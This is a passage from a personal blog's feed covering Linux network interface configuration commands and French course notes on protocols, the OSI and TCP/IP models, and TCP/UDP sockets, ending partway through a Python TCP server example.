&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;cli-configuration&quot;&gt;cli configuration&lt;/h2&gt;
&lt;hr /&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip addr flush dev eth0
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip addr show dev eth0 &lt;span class=&quot;c&quot;&gt;# check&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip addr add 192.168.42.57/24 brd + dev eth0
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip addr show dev eth0 &lt;span class=&quot;c&quot;&gt;# check&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip route add default via 192.168.42.254
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip route &lt;span class=&quot;c&quot;&gt;# check&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# test routing and find output interface&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip route get 164.81.1.4
164.81.1.4 via 192.168.42.254 dev eth0 src 192.168.42.57

&lt;span class=&quot;c&quot;&gt;# dhcp: interfaces + /etc/resolv.conf + default route&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dhclient eth0

&lt;span class=&quot;c&quot;&gt;# dns config&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim /etc/resolv.conf
nameserver 9.9.9.9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;file-configuration&quot;&gt;file configuration&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;more /etc/network/interfaces

auto lo &lt;span class=&quot;c&quot;&gt;# start at boot&lt;/span&gt;
iface lo inet loopback

auto eth0 &lt;span class=&quot;c&quot;&gt;# start at boot&lt;/span&gt;
iface eth0 inet static &lt;span class=&quot;c&quot;&gt;# static config.&lt;/span&gt;
    address 192.168.42.57
    netmask 255.255.255.0
    gateway 192.168.42.254

auto eth1 &lt;span class=&quot;c&quot;&gt;# start at boot&lt;/span&gt;
iface eth1 inet dhcp &lt;span class=&quot;c&quot;&gt;# automatic config.&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# restart service&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl restart networking
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;old-commands&quot;&gt;old commands&lt;/h2&gt;
&lt;hr /&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# show config.&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ifconfig &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# up/down interface&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ifconfig eth0 up
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ifconfig eth0 down

&lt;span class=&quot;c&quot;&gt;# config. ip&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ifconfig eth0 192.168.1.1/24

&lt;span class=&quot;c&quot;&gt;# delete ip&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ifconfig eth0 0.0.0.0/0

&lt;span class=&quot;c&quot;&gt;# interface dhcp, ip + gateway + dns + ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dhclient eth0 

&lt;span class=&quot;c&quot;&gt;# routing table&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;route

&lt;span class=&quot;c&quot;&gt;# add gateway&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;route add default gw 192.168.1.254 eth0

&lt;span class=&quot;c&quot;&gt;# add network route&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;route add &lt;span class=&quot;nt&quot;&gt;-net&lt;/span&gt; 172.16.10.10/24 gw 192.168.1.254

&lt;span class=&quot;c&quot;&gt;# add host route&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;route add &lt;span class=&quot;nt&quot;&gt;-host&lt;/span&gt; 98.76.54.32 gw 12.34.56.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;hr /&gt;
</content>
 </entry>
 
 <entry>
   <title>réseaux</title>
   <link href="http://localhost:4000/network/2019/02/27/reseaux/"/>
   <updated>2019-02-27T00:00:00+01:00</updated>
   <id>http://localhost:4000/network/2019/02/27/reseaux</id>
   <content type="html">&lt;!--more--&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ivre&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;zeek &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; challenge.pcapng
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ll
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;@  1 Adel  staff  36944476 Nov 20 23:05 challenge.pcapng &lt;span class=&quot;c&quot;&gt;# base&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;@  1 Adel  staff   9839932 Dec 31 14:27 conn.log
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;@  1 Adel  staff      2771 Dec 31 14:27 dns.log
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;@  1 Adel  staff      1745 Dec 31 14:27 files.log
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 Adel  staff      2378 Dec 31 14:27 http.log
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;@  1 Adel  staff       254 Dec 31 14:27 packet_filter.log
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 Adel  staff     13430 Dec 31 14:27 weird.log

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;quest-ce-quun-protocole-&quot;&gt;Qu’est-ce qu’un protocole ?&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;Accord entre les parties sur la façon de communiquer :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;définit le format des données échangées&lt;/li&gt;
  &lt;li&gt;définit l’ordre des messages emis et reçus&lt;/li&gt;
  &lt;li&gt;définit les réactions à ces messages&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# example of HTTP protocol&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# socat to create TCP socket&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;socat - tcp:adel-allam.fr:80
&lt;span class=&quot;c&quot;&gt;# request&lt;/span&gt;
GET / HTTP/1.1
Host: adel-allam.fr

&lt;span class=&quot;c&quot;&gt;# response header&lt;/span&gt;
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Tue, 26 Feb 2019 17:54:42 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: https://adel-allam.fr/

&lt;span class=&quot;c&quot;&gt;# response body&lt;/span&gt;
&amp;lt;html&amp;gt;
&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;title&amp;gt;301 Moved Permanently&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body &lt;span class=&quot;nv&quot;&gt;bgcolor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;white&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;301 Moved Permanently&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&lt;span class=&quot;c&quot;&gt;# other way&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-vI&lt;/span&gt; adel-allam.fr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On parle souvent de pile de protocoles, c’est-à-dire que chaque couche est associée à un protocole. L’ensemble des couches a été normalisé par l’ISO en 7 couches. C’est le modèle OSI (Open System Interconnection). Il existe aussi le modèle TCP/IP qui est plus simple (seul ce dernier a été implémenté).&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;pourquoi-un-modèle-en-couches-&quot;&gt;Pourquoi un modèle en couches ?&lt;/h2&gt;
&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;réduire complexité de conception&lt;/li&gt;
  &lt;li&gt;chaque couche fournit des services distincts&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;modèle-osi&quot;&gt;Modèle OSI&lt;/h2&gt;
&lt;hr /&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Layer&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Number&lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt;PDU (Protocol Data Unit)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Application&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;7&lt;/td&gt;
      &lt;td&gt;application services (HTTP, Telnet, FTP, SIP)&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Presentation&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td&gt;data translation (MIME), encryption (SSL), compression&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Session&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td&gt;dialog control, synchronization&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Transport&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td&gt;reliable (TCP, UDP, TCP, SCTP)&lt;/td&gt;
      &lt;td&gt;Segment&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Network&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td&gt;source-to-destination (IP), routing, address resolution&lt;/td&gt;
      &lt;td&gt;Packet&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Data Link&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td&gt;wireless link (802.11), wired link (802.3)&lt;/td&gt;
      &lt;td&gt;Frame&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Physical&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td&gt;fiber, radio, bluetooth&lt;/td&gt;
      &lt;td&gt;Bits&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;modèle-tcpip&quot;&gt;Modèle TCP/IP&lt;/h2&gt;
&lt;hr /&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Layer&lt;/th&gt;
      &lt;th&gt;Protocols&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Application&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;FTP, DNS, SSH, SNMP, SMTP, HTTP, TFTP, DHCP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Transport&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;UDP, TCP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Network&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;IPv4, IPv6, IP NAT, IPSec, routing(RIP, OSPF, BGP)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Date Link, Physical&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;SLIP, PPP&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Les clients et les serveurs possèdent 7 couches, les routeurs, eux, n’en n’ont besoin que de 3 (&lt;code class=&quot;highlighter-rouge&quot;&gt;Network&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Data Link&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Physical&lt;/code&gt;). Car ces derniers ne sont là que pour réaliser l’action de routage.&lt;/p&gt;

&lt;p&gt;Les protocoles dans le monde TCP/IP sont définis par les &lt;code class=&quot;highlighter-rouge&quot;&gt;RFC&lt;/code&gt; (Request For Comment). Ces documents expliquent en détails toutes les caractéristiques d’un protocole donné.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;types-de-communication-en-tcpip&quot;&gt;Types de communication en TCP/IP&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mode connecté&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;unicast&lt;/li&gt;
      &lt;li&gt;données arrivent dans l’ordre&lt;/li&gt;
      &lt;li&gt;pas de perte&lt;/li&gt;
      &lt;li&gt;communication bi-directionnelle (2 sens) et full-duplex (simultanée)&lt;/li&gt;
      &lt;li&gt;demande d’accord entre les 2 intercoluteurs, 2 demi-connexions&lt;/li&gt;
      &lt;li&gt;mode offert par &lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt;, Transport Control Protocol (mode connecté simulé par TCP sur réseau en mode datagramme)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mode datagramme&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;unicast ou multicast&lt;/li&gt;
      &lt;li&gt;données dans paquets de taille limitée&lt;/li&gt;
      &lt;li&gt;possibles pertes de paquets&lt;/li&gt;
      &lt;li&gt;mode offert par &lt;code class=&quot;highlighter-rouge&quot;&gt;UDP&lt;/code&gt;, User Datagram Protocol&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;modèle-clientserveur&quot;&gt;Modèle client/serveur&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;En TCP/IP, les communications fonctionnent souvent suivant un modèle client/serveur. Un serveur est en attente de la connexion de clients sur un port. Derrière ce dernier, se trouve un service que le client veut contacter. Un serveur peut fournir plusieurs services (ex: web, mail, dns). On utilise la notion de ports afin de différencier (multiplexer) les services. Ces numéros de ports sont standardisés. Sous Linux, on peut les retrouver dans &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/services&lt;/code&gt;. Ces derniers sont définis sur 16 bits, allant 1 à 65 535.&lt;/p&gt;

&lt;p&gt;Une communication est identifiée par un couple de &lt;code class=&quot;highlighter-rouge&quot;&gt;TSAP&lt;/code&gt; (Transport Service Access Point) : (TSAPsrc., TSAPdst.), un TSAP est composé d’une adresse IP et d’un numéro de port: &lt;code class=&quot;highlighter-rouge&quot;&gt;('10.0.0.10',80)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Un socket fourni un moyen de communication entre processus, identifié par un TSAP unique.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;tcp&quot;&gt;TCP&lt;/h2&gt;
&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;protocole de transport fiable, mode connecté, mode full-duplex&lt;/li&gt;
  &lt;li&gt;socket TCP peut traiter plusieurs connexions simultanément&lt;/li&gt;
  &lt;li&gt;communication = TSAPcli &amp;lt;-&amp;gt; TSAPsrv&lt;/li&gt;
  &lt;li&gt;flot continu de données, reçu dans l’ordre&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;udp&quot;&gt;UDP&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;protocole de transport non-fiable, sans connexion&lt;/li&gt;
  &lt;li&gt;manipule des datagrammes, 1 datagramme UDP = 1 datagramme IP&lt;/li&gt;
  &lt;li&gt;ordre de réception des paquets non garantie&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# TCP server
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# return new discussion socket
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# TCP client
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# get system port number
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# connect to server
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# UDP server
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;recvfrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# UDP client
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;recvfrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Les connexions d’une machine sont visibles avec &lt;code class=&quot;highlighter-rouge&quot;&gt;$ netstat&lt;/code&gt; ou &lt;code class=&quot;highlighter-rouge&quot;&gt;$ ss&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt;: permet de créer un TSAP, c’est-à-dire un nouveau point d’accès de service de transport. On doit lui fournir 3 paramètres:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;famille d’adresses utilisées
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AF_UNIX&lt;/code&gt; pour du local&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AF_INET&lt;/code&gt; pour de l’IPv4&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AF_INET6&lt;/code&gt; pour de l’IPv6&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;type de service demandé
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SOCK_STREAM&lt;/code&gt; flot d’octets (mode connecté)&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SOCK_SGRAM&lt;/code&gt; datagramme (mode non connecté)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;protocole de transport utilisé
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IPPROTO_TCP&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IPPROTO_UDP&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IPPROTO_ICMP&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; : permet d’attribuer un numéro de port au socket.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;listen()&lt;/code&gt; : utilisé en mode connecté, lorsque plusieurs clients sont susceptibles de demander une ou plusieurs connexions avec le serveur.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; : utilisé en mode connecté, permet de se bloquer en attente d’une nouvelle demande de connexion, la connexion devient complète entre les 2 processus. Il renvoie un pointeur sur un nouveau socket de structure identique au précédent, le socket original sert à établir une nouvelle connexion, la nouvelle permet l’échange avec le client associé.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt;: permet à un client de se connecter à un serveur, ouvre connexion entre les 2, on lui fourni l’adresse IP du serveur.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;send()/recv()&lt;/code&gt; : permettent l’échange d’informations au travers du socket.&lt;/p&gt;

&lt;h3 id=&quot;serveur-python&quot;&gt;Serveur python&lt;/h3&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;access_mask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# filtre les clients, ici aucun n'est filtre
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6688&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# be able to re-use the port faslty
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOL_SOCKET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SO_REUSEADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_mask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# configure the queue
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOMAXCONN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# return new cocket
